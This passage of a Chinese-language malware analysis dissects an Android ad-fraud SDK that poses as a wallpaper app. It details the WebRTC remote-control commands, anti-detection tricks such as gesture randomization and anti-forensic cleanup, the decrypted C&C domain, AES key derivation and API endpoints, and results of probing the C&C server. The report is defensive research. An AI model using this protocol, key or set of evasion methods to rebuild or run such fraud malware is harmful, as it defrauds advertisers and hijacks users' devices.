| `Content.DoneMessage` | 会话结束信号 |

### 8.3 远程控制命令协议

**文件**: `c13/nim5/ez8/h5_proto/signaling/ControlCommand.java`

#### Click 命令 (点击)

```java
public static class Click extends ControlCommand {
    private final ClickEvent click;
    // ClickEvent 包含: normalizedX (0.0-1.0), normalizedY (0.0-1.0)
}
```

坐标转换 (`IllIIlIIII1.java:1240-1251`)：
```java
float pixelX = (float) (normalizedX * webView.getWidth());
float pixelY = (float) (normalizedY * webView.getHeight());
```

#### Scroll 命令 (滚动)

```java
public static class Scroll extends ControlCommand {
    private final ScrollEvent scroll;
    // ScrollEvent 包含: deltaX, deltaY (滚动增量)
}
```

#### Input 命令 (文本输入)

```java
public static class Input extends ControlCommand {
    private final TextInput input;
    // TextInput 包含: text (要输入的文本)
}
```

命令通过 `command_type` 字段 hash 分发: "click" (94750088), "scroll" (-907680051), "input" (100358090)。

### 8.4 WebRTC 连接建立流程

**核心文件**: `llIIIIlIlllIII1/IllIIlIIII1.java`

```
Step 1: PeerConnectionFactory 初始化 (行 1123-1170)
   ├── VideoEncoderFactory (默认)
   └── VideoDecoderFactory (自定义, 分辨率限制 1280x720)

Step 2: 信令连接触发 → lllIlIIIlI1() (行 1176-1192)

Step 3: 收到远端 SDP Offer (行 1254-1265)
   ├── setRemoteDescription(offer)
   └── createAnswer(constraints)
       ├── OfferToReceiveAudio = false
       └── OfferToReceiveVideo = true

Step 4: Answer 创建成功 (行 385-398)
   └── setLocalDescription(answer)

Step 5: 本地描述设置成功 (行 361-372)
   └── 通过信令发送 Answer 至服务端

Step 6: ICE 候选收集 (行 513-529)
   └── 逐个发送 ICE Candidate (sdp, sdpMid, sdpMLineIndex)

Step 7: 远端 ICE 候选到达 (行 297-326)
   ├── 远端描述已设置 → 直接 addIceCandidate
   └── 远端描述未设置 → 缓存，待设置后批量添加
```

### 8.5 状态机

**文件**: `c13/nim5/ez8/h5_proto/signaling/UpdateSignalingStatusRequest.java:31-76`

```
UNKNOWN (0) → START (1) → IN_LANDING (2) → DONE (3)
```

| 状态 | 值 | 含义 |
|------|---|------|
| `UNKNOWN` | 0 | 初始/未知状态 |
| `START` | 1 | 已启动 |
| `IN_LANDING` | 2 | 正在加载着陆页 (上报当前 URL) |
| `DONE` | 3 | 任务完成 |

`UpdateSignalingStatusRequest` 包含: atom, jobId, status, url

#### 连接状态 (`ConnectionStatus.java`)

```
CONNECTED (0) → RECONNECTING (1) → DISCONNECTED (2)
```

### 8.6 心跳/保活机制

#### 信令层心跳 (Ping/Pong)

客户端发送 `SignalingRequest.Content.PingMessage`，服务端回复 `SignalingResponse.Content.PongMessage`。两者均包含 `message` 字段。

#### DataChannel 层心跳 (`IllIIlIIII1.java:1098-1121`)

```java
JSONObject pong = new JSONObject();
pong.put("type", "pong");
pong.put("message", "pong_from_device");
dataChannel.send(new DataChannel.Buffer(ByteBuffer.wrap(pong.toString().getBytes()), false));
```

在 DataChannel 状态变为 OPEN 时首次调用。

#### WebSocket 连接丢失检测 (`llIIllIl1/llllIIIIll1.java:86-93`)

- 默认超时: **60 秒**
- 检测间隔: 超时时间的 **1.5 倍** (90 秒)
- 超时未收到 Pong → 关闭连接 (code=1006)

### 8.7 插件启动检查

**请求**: `CheckSignalingPluginStartRequest` (包含 Atom)

**响应**: `CheckSignalingPluginStartResponse`
```json
{
    "code": 0,        // 0=成功
    "message": "",
    "run": true,      // 是否启动
    "offerId": "",    // Offer标识
    "jobId": ""       // 任务ID
}
```

流程 (`IlIlllIIlI1/llllIllIl1.java:306-321`)：
```
发送 CheckSignalingPluginStart → CountDownLatch.await()
   → code==0 且 run==true → 保存 offerId/jobId → 启动信令
   → 否则 → 断开连接
```

### 8.8 视频采集系统

#### VirtualDisplay 模式 (主)

**文件**: `llIIIIlIlllIII1/llllIllIl1.java`

- 使用 `DisplayManager` 创建 VirtualDisplay
- WebView 渲染到虚拟显示器
- `ImageReader` 捕获帧数据
- `SurfaceTextureHelper` 送入 WebRTC 视频管道
- 帧率: **15 fps**

#### Bitmap 模式 (备用)

**文件**: `llIIIIlIlllIII1/llllIIIIll1.java`

通过 `Surface.lockHardwareCanvas()` 将 Bitmap 直接绘制到 WebRTC Surface。

#### 视频配置

- 最大帧间隔: 50ms (20fps 上限)
- 视频解码器限制分辨率: **1280×720**
- 最大重试次数: 2

### 8.9 错误处理与重连

| 场景 | 处理逻辑 |
|------|---------|
| ICE FAILED | `restartIce()` → 延迟检查 → 若仍 FAILED 则完全重建 |
| ICE DISCONNECTED | 延迟检查 → 若仍 DISCONNECTED 则 `restartIce()` |
| ICE 候选错误 (701/702) | 触发 `restartIce()` |
| DataChannel CLOSED/CLOSING | 检查 ICE 状态 → 非 CONNECTED 则延迟 1000ms 完全重建 |
| SDP 协商失败 | 统一调用 `llIIllIl1()` 触发错误处理 |
| 信令层异常 | 记录日志 → 触发完全重建 |

### 8.10 资源清理

**方法**: `IIIlIllIlI1()` (行 876-957)

使用 `AtomicBoolean.compareAndSet(false, true)` 确保只执行一次：

```
1. 取消截屏定时器
2. 停止连接丢失检测
3. 重置就绪标志
4. 关闭 DataChannel
5. 关闭 PeerConnection
6. 释放 VideoTrack / VideoSource
7. 释放 PeerConnectionFactory
8. 通知信令客户端清理
9. 关闭线程池
10. 取消心跳定时器
```

每一步包裹在独立 try/catch 中，确保某步失败不影响后续清理。

## 九、反检测手段

| 手段 | 实现 |
|---|---|
| **字符串全加密** | 所有字符串使用 XOR 密码加密（8字节密钥），运行时解密 |
| **AES-256-CFB** | 网络通信使用 AES-CFB/NoPadding 加密 + GZIP 压缩 |
| **包名伪装** | 使用 `com.android.wallpaper` 伪装成系统壁纸应用 |
| **类名混淆** | 使用 `IlIIlllllI1`/`llllIIIIll1` 等 l/I 混淆命名 |
| **PackageManager Hook** | 配置中包含 `hookPackageManagerStackTraces`，主动 hook 包管理器 |
| **手势随机化** | 坐标偏移、贝塞尔曲线、压力/时间随机化 |
| **反取证清理** | 每次任务后清除 cookies、缓存、历史、表单数据、SSL 偏好 |
| **进程检查** | 检查当前进程名是否匹配包名 |
| **时间窗口检查** | 21600000ms (6小时) 冷却时间，防止频繁执行 |
| **定时器** | 每30分钟 (1800000ms) 循环执行任务 |

## 十、关键文件路径

| 组件 | 反编译路径 |
|---|---|
| 入口点 | `com/nied/MainActivity.java` → `com/nied/lduvv/Kucopd.java` |
| 触摸伪造 | `com/nied/MotionHelper.java` |
| 随机数工具 | `com/nied/RandomHelper.java` |
| 字符串加密 | `IlIlllIIlI1/IllIIlIIII1.java` |
| SDK配置常量 | `IlIlllIIlI1/llllIIIIll1.java` |
| 主控制逻辑 | `IlIlllIIlI1/llllIllIl1.java` |
| HTTP通信 | `c13/nim5/ez8/h5_proto/HttpGatewayClient.java` |
| SDK核心 | `c13/nim5/ez8/h5_proto/DllpgdLiteSDK.java` |
| 设备指纹 | `c13/nim5/ez8/h5_proto/Atom.java` |
| 远程配置 | `c13/nim5/ez8/h5_proto/DllpgdConfig.java` |
| WebRTC信令 | `c13/nim5/ez8/h5_proto/signaling/` |
| WebView控制 | `lIllIlIll1/` (混淆包) |
| 点击测试页 | `assets/click_test.html` |
| ART 性能配置 | `assets/dexopt/baseline.prof`, `assets/dexopt/baseline.profm` |

## 十一、C&C 通信协议实测验证

### 11.1 XOR 解密全量常量

通过实现 XOR 解密引擎，对 `HttpGatewayClient.java` 和 `DllpgdLiteSDK.java` 中所有加密常量进行批量解密，得到以下真实值：

#### 服务器与协议常量

| 分类 | 加密形式 | 解密结果 |
|------|----------|----------|
| **C&C 域名** | `{-23,123,-35,-81,94,-27,-90,-90,-31,126,-46,-76}` | `dllpgd.click` |
| **AES 密钥种子** | `{38,-117,-123,-14,-53,113,-43,-72}` | `GreenDay` |
| **加密算法** | `{-116,-56,63,...}` (18字节) | `AES/CFB/NoPadding` |
| **Content-Type** | `{30,-18,28,...}` (16字节) | `application/json` |
| **User-Agent** | `{-78,113,98,...}` (20字节) | `DllpgdLiteClient/2.0` |
| **请求编码** | `{60,-84,-126,...}` (5字节) | `UTF-8` |

#### API 端点路径

| 端点 | 解密路径 | 功能 |
|------|----------|------|
| getConfig | `/api/v1/dllpgd/getConfig` | 获取远程配置 |
| updateEvent | `/api/v1/dllpgd/updateEvent` | 上报事件 |
| updateLog | `/api/v1/dllpgd/updateLog` | 上报日志 |

#### Atom (设备指纹) JSON 字段名

| 加密形式 | 解密字段名 | 用途 |
|----------|-----------|------|
| `{-57,88,-127,87,...}` | `deviceId` | 设备唯一标识 |
| `{89,24,-27,-39,...}` | `version` | 协议版本号 (硬编码=208) |
| `{81,50,43,-59,...}` | `appPackageName` | 应用包名 |
| `{-16,54,-35,-42,...}` | `gaId` | Google Advertising ID |
| `{93,66,11,-56}` | `data` | 数据负载 |
| `{58,-76,-5,-15,...}` | `sessionId` | 会话标识 |
| `{28,1,55,117,...}` | `appChannel` | 渠道标识 |
| `{77,-66,124,-101,...}` | `isGeneratedBySubProcess` | 子进程标志 |
| `{104,20,-45,104,...}` | `deviceInfo` | 设备信息对象 |
| `{92,-27,23,-25,...}` | `pluginInfos` | 插件信息列表 |

#### DeviceInfo 子对象字段名

| 解密字段名 | 用途 |
|-----------|------|
| `locale` | 系统语言/地区 |
| `timezone` | 时区 |
| `phoneModel` | 手机型号 |
| `androidVersion` | Android 版本 |
| `phoneTimestamp` | 设备时间戳 |

### 11.2 AES 密钥派生实测

```
种子字符串:   "GreenDay"
         ↓ MD5 Hash
MD5 摘要:     66987ce7134f63ef7ee6f5024ad312b3
         ↓ toUpperCase()
AES-256 密钥: 66987CE7134F63EF7EE6F5024AD312B3 (32字节 ASCII = 256位)
```

> **重要更正**: 此前分析中将加密模式误记为 `AES/CBC/PKCS5Padding`。经 XOR 解密 `Cipher.getInstance()` 参数字符串，实际加密模式为 **`AES/CFB/NoPadding`**（密文反馈模式，无填充）。Java 默认 CFB segment size 为 128 位（等效于 CFB128）。

### 11.3 C&C 服务器基础设施探测

对 `dllpgd.click` 域名进行 DNS 解析和端口探测：

| 项目 | 结果 |
|------|------|
| **DNS 解析** | `18.204.68.18`, `18.206.233.238` (AWS EC2, us-east-1) |
| **HTTPS (443)** | 连接拒绝 (Connection Refused) |
| **HTTP (80)** | 连接成功，Spring Boot Whitelabel Error Page |
| **服务器框架** | Spring Boot (Java) |
| **状态** | 服务器存活，但 API 端点已下线 |

### 11.4 API 端点探测结果

使用完整加密管道构造请求并发送至 C&C 服务器：

```
请求配置:
  URL:           http://dllpgd.click/api/v1/dllpgd/{endpoint}
  Method:        POST
  Content-Type:  application/json
  User-Agent:    DllpgdLiteClient/2.0
  Body:          5层加密后的 Atom JSON
  加密模式:       AES-256-CFB/NoPadding
  AES Key:       66987CE7134F63EF7EE6F5024AD312B3
```

| 端点 | HTTP 状态码 | 响应 |
|------|-------------|------|
| `/api/v1/dllpgd/getConfig` | **404** | Spring Boot Whitelabel Error |
| `/api/v1/dllpgd/updateEvent` | **404** | Spring Boot Whitelabel Error |
| `/api/v1/dllpgd/updateLog` | **404** | Spring Boot Whitelabel Error |
| `/` (根路径) | **404** | Whitelabel Error Page |
| `/api/` | **404** | Whitelabel Error Page |
| `/api/v1/` | **404** | Whitelabel Error Page |
| `/actuator` | **404** | Whitelabel Error Page |

**结论**: C&C 服务器 Spring Boot 实例仍在运行，但所有 API 路由已被移除或未部署。该恶意软件的后端基础设施已被停用（decommissioned），无法获取实际配置数据或上报功能。

### 11.5 协议重建工具

已编写完整的 C&C 协议重建脚本 `c2_client.py`，实现：

- XOR 解密引擎（批量解密所有加密常量）
- AES-256-CFB 加密/解密（与 APK 完全一致的实现）
- GZIP 压缩/解压
- 5 层加密管道（JSON → GZIP → Base64 → AES → Base64）
- Atom 设备指纹构造
- 三个 API 端点的请求发送

## 十二、Assets 资源文件分析

### 12.1 click_test.html — 点击监控测试页

**文件**: `assets/click_test.html` (1,377 字节)

功能：一个用于测试和校准程序化点击的 HTML 测试页面。

```html
<!-- 核心逻辑 -->
<script>
document.addEventListener('click', function(event) {
    var x = event.clientX;
    var y = event.clientY;
    // 调用 Android 原生接口
    AndroidInterface.onClick(x, y);
});
</script>
```

- 页面显示文本 "Click on this page" 并渲染可点击区域
- 监听所有 `click` 事件，记录精确坐标 (clientX, clientY)
- 通过 `AndroidInterface.onClick()` 将坐标回传给 Android 端
- 用于验证 `MotionHelper` 生成的模拟触摸事件是否被 WebView 正确识别

### 12.2 Baseline Profile — 恶意代码性能优化

#### 文件概述

| 文件 | 大小 | 格式 | 说明 |
|------|------|------|------|
| `assets/dexopt/baseline.prof` | 2,971 字节 | ART Profile V010 P | Android 9+ AOT 编译配置 |
| `assets/dexopt/baseline.profm` | 283 字节 | ART Profile Metadata V002 | Android 12+ 元数据补充 |

#### 加载机制

通过 `androidx.profileinstaller.ProfileInstaller` 在应用安装或首次启动时加载：

```
assets/dexopt/baseline.prof
        ↓ ProfileInstaller.transcodeAndWrite()
/data/misc/profiles/cur/0/<package>/primary.prof
        ↓ ART 编译器读取
AOT 编译指定 Hot 方法 → 原生机器码
```

- 源码位置: `androidx/profileinstaller/ProfileInstaller.java`
- 配置路径常量: `PROFILE_SOURCE_LOCATION = "dexopt/baseline.prof"` (行 108)
- 元数据路径常量: `PROFILE_META_LOCATION = "dexopt/baseline.profm"` (行 107)
- 写入路径: `/data/misc/profiles/cur/0/<pkg>/primary.prof`

#### Profile 二进制格式解析

```
baseline.prof 结构:
┌──────────────────────────┐
│ Magic: "pro\x00"         │  4 字节
│ Version: "010\x00"       │  4 字节  (ART Profile V010)
│ DEX 文件数: 1             │  1 字节
│ Uncompressed Size: 21616 │  4 字节
│ Compressed Size: 2950    │  4 字节
│ zlib 压缩数据             │  2950 字节
└──────────────────────────┘

解压后数据 (21,616 字节):
┌──────────────────────────┐
│ DEX Key: "classes.dex"   │  关联的 DEX 文件标识
│ Checksum: 0x23B6B1C2     │  DEX 校验和
│ Method Bitmap             │  Hot/Startup/PostStartup 标记
│ Class Bitmap              │  类加载状态标记
└──────────────────────────┘
```

#### 性能优化的恶意方法统计

从 profile 中提取的 1,218 个 HOT 标记方法中，以下为恶意功能相关的关键优化类：

| 类/包 | HOT 方法数 | 功能 | 优化意义 |
|--------|-----------|------|----------|
| `lIllIlIll1.*` (WebView控制包) | ~100+ | WebView 配置、JS 注入、页面加载 | 加速广告页面加载和交互 |
| `c13.nim5.ez8.h5_proto.signaling.*` | ~50+ | WebRTC 信令消息构造和解析 | 降低远程控制延迟 |
| `c13.nim5.ez8.h5_proto.HttpGatewayClient` | ~20 | HTTP 通信、AES 加密解密 | 加速 C&C 通信加密管道 |
| `c13.nim5.ez8.h5_proto.DllpgdLiteSDK` | ~10 | SDK 核心方法 | 加速初始化流程 |
| `com.nied.MotionHelper` | ~5 | 触摸事件伪造 | 确保触摸注入的低延迟 |
| `IlIlllIIlI1.*` (混淆工具包) | ~30 | XOR 解密、设备ID生成 | 加速字符串解密操作 |
| `IlIlIIIlIlIlll1.*` | ~15 | MD5、AES、环境检测 | 加速加密和反分析检查 |

**高频调用方法 TOP 5**:

| 方法 (DEX method_id) | 调用/引用次数 | 推测功能 |
|---------------------|-------------|----------|
| 信令消息构造器 | 366 次 | WebRTC 信令 JSON 序列化 |
| WebView 控制方法 | 127 次 | 页面加载/JS 执行控制 |
| 字符串解密 (XOR) | 95 次 | 运行时常量解密 |
| HTTP 请求发送 | 48 次 | C&C 通信 |
| 触摸事件分发 | 33 次 | MotionEvent 注入 |

#### 安全分析意义

Baseline Profile 的存在表明该恶意软件的开发者有意识地对恶意代码执行路径进行了 **AOT 编译优化**：

1. **降低启动延迟**: 恶意功能的核心方法在安装时即编译为原生代码，避免 JIT 编译开销
2. **提升帧捕获性能**: VirtualDisplay 的 `onImageAvailable` 回调被标记为 HOT，确保屏幕捕获的低延迟
3. **优化远程控制响应**: WebRTC 信令相关方法的 AOT 编译降低了远程指令的响应时间
4. **加速加密操作**: AES/XOR 等加密方法的编译优化减少了通信延迟
5. **平滑触摸注入**: MotionHelper 的优化确保模拟触摸事件的时序精度，使其更难被反欺诈系统检测

这种做法在合法应用中用于改善用户体验，但在此恶意 SDK 中被用于确保欺诈操作的高效执行。
